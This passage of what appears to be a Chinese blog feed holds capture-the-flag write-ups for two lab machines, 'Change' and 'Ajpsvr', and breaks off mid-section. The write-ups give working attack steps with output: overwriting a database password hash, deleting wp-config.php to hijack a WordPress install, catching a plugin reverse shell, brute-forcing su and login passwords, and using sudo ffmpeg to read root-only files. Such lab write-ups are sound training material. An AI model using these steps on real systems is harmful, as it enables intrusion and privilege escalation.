class="hljs-variable">$Af33bvt</span>/ZJXZuBT/Q7l0Xu/GvoQkjPFTMTc.pEA7ipCZBBF0V9aaW //明文：123456<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [changeweb]&gt; UPDATE <span class="hljs-built_in">users</span> SET password = <span class="hljs-string">&#x27;$2y$10$Af33bvt/ZJXZuBT/Q7l0Xu/GvoQkjPFTMTc.pEA7ipCZBBF0V9aaW&#x27;</span> <span class="hljs-built_in">where</span> username = <span class="hljs-string">&#x27;root&#x27;</span>;<br>Query OK, 1 row affected (0.020 sec)<br>Rows matched: 1  Changed: 1  Warnings: 0<br></code></pre></td></tr></table></figure><h1 id="五、获取SHELL"><a href="#五、获取SHELL" class="headerlink" title="五、获取SHELL"></a>五、获取SHELL</h1><p>使用<code>root:123456</code>进行登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507221655370.png"></p><p>发现只可以执行<code>ls,rm,pwd</code>命令，在<code>/var/www/</code>目录下面找到一个<code>wordpress.change.dsz</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507221659013.png"></p><p>添加解析后进行访问，发现是<code>wordpress</code>框架<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507221701477.png"></p><h2 id="WordPress利用"><a href="#WordPress利用" class="headerlink" title="WordPress利用"></a>WordPress利用</h2><p>查看目录<code>ls /var/www/wordpress.change.dsz/</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507221704205.png"></p><p>根据给的命令，发现可以执行删除操作，那么就把<code>wp-config.php</code>删除，重新安装即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /var/www/wordpress.change.dsz/wp-config.php<br></code></pre></td></tr></table></figure><p>重新访问<code>wordpress.change.dsz</code>，需要重新进行安装<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507221707115.png"></p><p>设置数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">数据库名：changeweb<br>用户：change<br>密码：change<br></code></pre></td></tr></table></figure><p>设置网站的用户名和密码即可进行登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507221718904.png"></p><p>利用插件进行反弹shell</p><p>获取到SHELL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tools/php]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.60] 41886<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (466): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@Change:/var/www/wordpress.change.dsz/wp-admin$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Change:/home/lzh$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-a05597ed1f36976e88c2e10a74902c52&#125;<br></code></pre></td></tr></table></figure><h1 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h1><h2 id="1、提权至lzh"><a href="#1、提权至lzh" class="headerlink" title="1、提权至lzh"></a>1、提权至lzh</h2><p>查看<code>/home/lzh</code>，发现存在密码文件<code>.pass.txt</code>，使用<code>suForce</code>进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Change:/tmp$ ./suForce -ulzh -w /home/lzh/.pass.txt <br>            _____                          <br> ___ _   _ |  ___|__  _ __ ___ ___   <br>/ __| | | || |_ / _ \| <span class="hljs-string">&#x27;__/ __/ _ \ </span><br><span class="hljs-string">\__ \ |_| ||  _| (_) | | | (_|  __/  </span><br><span class="hljs-string">|___/\__,_||_|  \___/|_|  \___\___|  </span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string"> code: d4t4s3c     version: v1.0.0</span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string">🎯 Username | lzh</span><br><span class="hljs-string">📖 Wordlist | /home/lzh/.pass.txt</span><br><span class="hljs-string">🔎 Status   | 156/201/77%/1a2b3c4d1a2b3c4d</span><br><span class="hljs-string">💥 Password | 1a2b3c4d1a2b3c4d</span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string">tput: No value for $TERM and no -T specified</span><br></code></pre></td></tr></table></figure><p>使用密码<code>1a2b3c4d1a2b3c4d</code>，切换至<code>lzh</code>用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Change:/tmp$ su - lzh<br>Password: <br>lzh@Change:~$ <span class="hljs-built_in">id</span><br>uid=1000(lzh) gid=1000(lzh) <span class="hljs-built_in">groups</span>=1000(lzh)<br></code></pre></td></tr></table></figure><h2 id="2、提权至root用户"><a href="#2、提权至root用户" class="headerlink" title="2、提权至root用户"></a>2、提权至root用户</h2><p>检查<code>sudo</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">lzh@Change:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> lzh on Change:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User lzh may run the following commands on Change:<br>    (ALL) NOPASSWD: /usr/bin/ffmpeg<br></code></pre></td></tr></table></figure><p>发现<code>lzh</code>用户不用密码即可<code>sudo</code>运行<code>/usr/bin/ffmpeg</code></p><h3 id="ffmpeg提权"><a href="#ffmpeg提权" class="headerlink" title="ffmpeg提权"></a>ffmpeg提权</h3><h5 id="方法一：直接通过报错信息输出⽂件内容"><a href="#方法一：直接通过报错信息输出⽂件内容" class="headerlink" title="方法一：直接通过报错信息输出⽂件内容"></a>方法一：直接通过报错信息输出⽂件内容</h5><p><code>sudo ffmpeg -f concat -i /root/root.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">lzh@Change:~$ <span class="hljs-built_in">sudo</span> ffmpeg -f concat -i /root/root.txt<br>ffmpeg version 4.3.7-0+deb11u1 Copyright (c) 2000-2024 the FFmpeg developers<br>  built with gcc 10 (Debian 10.2.1-6)<br>  configuration: --prefix=/usr --extra-version=0+deb11u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --<span class="hljs-built_in">arch</span>=amd64 --enable-gpl --disable-stripping --enable-avresample --disable-filter=resample --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librsvg --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwavpack --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --enable-opengl --enable-sdl2 --enable-pocketsphinx --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-shared<br>  libavutil      56. 51.100 / 56. 51.100<br>  libavcodec     58. 91.100 / 58. 91.100<br>  libavformat    58. 45.100 / 58. 45.100<br>  libavdevice    58. 10.100 / 58. 10.100<br>  libavfilter     7. 85.100 /  7. 85.100<br>  libavresample   4.  0.  0 /  4.  0.  0<br>  libswscale      5.  7.100 /  5.  7.100<br>  libswresample   3.  7.100 /  3.  7.100<br>  libpostproc    55.  7.100 / 55.  7.100<br>[concat @ 0x559cd6343e40] Line 1: unknown keyword <span class="hljs-string">&#x27;flag&#123;root-8d4727897d0129417e1f3f91d1474c1c&#125;&#x27;</span><br>/root/root.txt: Invalid data found when processing input<br></code></pre></td></tr></table></figure><h5 id="方法二：创建白色背景视频，将文本内容显示在视频中间"><a href="#方法二：创建白色背景视频，将文本内容显示在视频中间" class="headerlink" title="方法二：创建白色背景视频，将文本内容显示在视频中间"></a>方法二：创建白色背景视频，将文本内容显示在视频中间</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ffmpeg -f lavfi -i color=c=white:s=640x480:d=5 -vf <span class="hljs-string">&quot;drawtext=textfile</span><br><span class="hljs-string">=/root/root.txt:x=(w-text_w)/2:y=(h-text_h)/2:fontsize=24:fontcolor=black&quot;</span><br>-c:v libx264 -pix_fmt yuv420p output.mp4<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;root-8d4727897d0129417e1f3f91d1474c1c&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mysql</tag>
      
      <tag>wordpress</tag>
      
      <tag>sudo-ffmpeg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ajpsvr</title>
    <link href="/Maze-sec/Ajpsvr/"/>
    <url>/Maze-sec/Ajpsvr/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code><br>参考wp复现：<code>https://7r1umphk.github.io/post/nei-bu-_ajpsvr.html</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# nmap -sn 192.168.2.0/24     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-17 10:51 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.0014s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0014s latency).<br>MAC Address: 08:00:27:72:CB:61 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.59<br>Host is up (0.00037s latency).<br>MAC Address: 08:00:27:E0:D2:BE (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.22 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.59</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# nmap --min-rate 10000 -p- 192.168.2.59                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-17 10:51 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.59<br>Host is up (0.00026s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>8010/tcp open  xmpp<br>MAC Address: 08:00:27:E0:D2:BE (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.25 seconds<br></code></pre></td></tr></table></figure><p>开放端口<code>22,80,8010</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,8010 192.168.2.59<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-17 10:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.59<br>Host is up (0.0077s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 <span class="hljs-built_in">fc</span>:b2:88:5d:09:d8:06:40:81:<span class="hljs-built_in">cd</span>:5a:5c:53:79:60:54 (ECDSA)<br>|_  256 5b:b9:4d:de:03:f0:ee:72:d3:e3:e9:9d:e8:f1:3f:bd (ED25519)<br>80/tcp   open  http    nginx<br>|_http-title: 403 Forbidden<br>8010/tcp open  xmpp?<br>| fingerprint-strings: <br>|   GenericLines: <br>|_    ajpy<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port8010-TCP:V=7.94SVN%I=7%D=7/17%Time=68786573%P=x86_64-pc-linux-gnu%r<br>SF:(GenericLines,8,<span class="hljs-string">&quot;\x124\0\x04ajpy&quot;</span>);<br>MAC Address: 08:00:27:E0:D2:BE (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.78 seconds<br></code></pre></td></tr></table></figure><p><code>80</code>显示403<br><code>8010</code>开放的协议是<code>xmpp</code></p><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# nmap -sU --top-ports 100 192.168.2.59                         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-17 10:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.59<br>Host is up (0.0013s latency).<br>All 100 scanned ports on 192.168.2.59 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 54 closed udp ports (port-unreach), 46 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:E0:D2:BE (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 50.77 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口，发现无法访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl http://192.168.2.59<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;<br>&lt;body&gt;<br>&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;<br>&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.59 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.59<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak,md<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>Progress: 1323360 / 1323366 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>没有任何东西，转8010端口</p><h2 id="2、8010端口"><a href="#2、8010端口" class="headerlink" title="2、8010端口"></a>2、8010端口</h2><p>访问8010端口，发现无法访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl http://192.168.2.59:8010     <br>curl: (1) Received HTTP/0.9 when not allowed<br></code></pre></td></tr></table></figure><p>观察信息收集，发现8010端口可能开放着<code>AJP (Apache JServ Protocol)</code>服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">8010/tcp open  xmpp?<br>| fingerprint-strings: <br>|   GenericLines: <br>|_    ajpy<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port8010-TCP:V=7.94SVN%I=7%D=7/17%Time=68786573%P=x86_64-pc-linux-gnu%r<br>SF:(GenericLines,8,<span class="hljs-string">&quot;\x124\0\x04ajpy&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="AJP服务"><a href="#AJP服务" class="headerlink" title="AJP服务"></a>AJP服务</h3><p><strong>什么是 AJP？</strong></p><ul><li>AJP服务是指基于Apache JServ Protocol（AJP）协议的应用服务，主要用于Web服务器与Servlet容器（如Tomcat）之间的高效通信。</li><li>AJP是一种<strong>定向包协议</strong>，通过<strong>二进制格式</strong>传输数据（而非HTTP的纯文本），旨在提升Web服务器与应用服务器间的通信效率。它允许Web服务器（如Apache HTTP Server）将请求转发给后端的Servlet容器处理，常用于负载均衡或反向代理场景。&#96;</li></ul><p><strong>代理配置步骤：</strong></p><ol><li>启用Apache的相关代理模块<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install apache2<br><span class="hljs-built_in">sudo</span> a2enmod proxy    <br><span class="hljs-built_in">sudo</span> a2enmod proxy_http<br><span class="hljs-built_in">sudo</span> a2enmod proxy_ajp        <br></code></pre></td></tr></table></figure></li><li>创建一个新的 Apache 站点配置文件 <code>/etc/apache2/sites-available/ajp-proxy.conf</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Listen 8000<br>&lt;VirtualHost *:8000&gt;<br>    ProxyPass / ajp://192.168.2.59:8010/<br>    ProxyPassReverse / ajp://192.168.2.59:8010/<br>&lt;/VirtualHost&gt;<br></code></pre></td></tr></table></figure></li><li>启用该站点并重启 Apache 服务<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> a2ensite ajp-proxy.conf<br><span class="hljs-built_in">sudo</span> systemctl restart apache2<br></code></pre></td></tr></table></figure></li></ol><p>配置完成后，访问我们自己机器的 <code>http://127.0.0.1:8000</code> (或 <code>http://192.168.2.4:8000</code>) 就相当于在访问目标 <code>192.168.2.59:8010</code> 上的 Web 应用<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507212149037.png"></p><h1 id="四、漏洞利用与初始访问"><a href="#四、漏洞利用与初始访问" class="headerlink" title="四、漏洞利用与初始访问"></a>四、漏洞利用与初始访问</h1><p>代理设置后，再次对代理后的地址进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.4:8000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.4:8000<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak,md<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/login                (Status: 200) [Size: 21]<br>/test                 (Status: 200) [Size: 12]<br>/backdoor             (Status: 200) [Size: 9]<br>Progress: 1323360 / 1323366 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>找到三个路径：<code>/login</code>，<code>/test</code>，<code>/backdoor</code></p><h2 id="1、登录页面爆破"><a href="#1、登录页面爆破" class="headerlink" title="1、登录页面爆破"></a>1、登录页面爆破</h2><p>访问<code>/login</code>发现需要一个参数<code>password</code>，并且长度为<code>5</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl http://192.168.2.4:8000/login?password=<span class="hljs-built_in">test</span> <br>Password length is 5 <br></code></pre></td></tr></table></figure><p>提示我们需要爆破一个长度为 5 的密码。然而，直接使用常规字典爆破会遇到问题，因为后端对特殊字符的长度计算方式可能与我们预想的不同。正确的做法是对字典中的每一个密码进行 URL 编码。</p><ol><li>从 <code>rockyou.txt</code> 中筛选出所有长度为 5 的密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# grep -x <span class="hljs-string">&#x27;^.\&#123;5\&#125;$&#x27;</span> /usr/share/wordlists/rockyou.txt &gt; 5z.txt <br></code></pre></td></tr></table></figure></li><li>使用 Python 对筛选后的字典进行 URL 编码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# python3 -c <span class="hljs-string">&#x27;import sys, urllib.parse; [print(urllib.parse.quote(line.strip())) for line in sys.stdin]&#x27;</span> &lt; 5z.txt &gt; 5z_u.txt<br></code></pre></td></tr></table></figure></li><li>使用 <code>ffuf</code> 和编码后的字典进行爆破，并过滤掉返回内容为空的响应 (<code>--fs 0</code>)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# ffuf -u <span class="hljs-string">&quot;http://192.168.2.4:8000/login?password=FUZZ&quot;</span> -w 5z_u.txt --fs 0    <br>.....<br>%21%40%23%24%25         [Status: 200, Size: 25, Words: 1, Lines: 1, Duration: 3ms]<br>.....<br></code></pre></td></tr></table></figure></li><li>找到一个有效密码<code>%21%40%23%24%25</code>，解码后为<code>!@#$%</code></li></ol><h2 id="2、后门与远程代码执行"><a href="#2、后门与远程代码执行" class="headerlink" title="2、后门与远程代码执行"></a>2、后门与远程代码执行</h2><p>用找到的密码访问登录页面，返回新的路径</p><figure 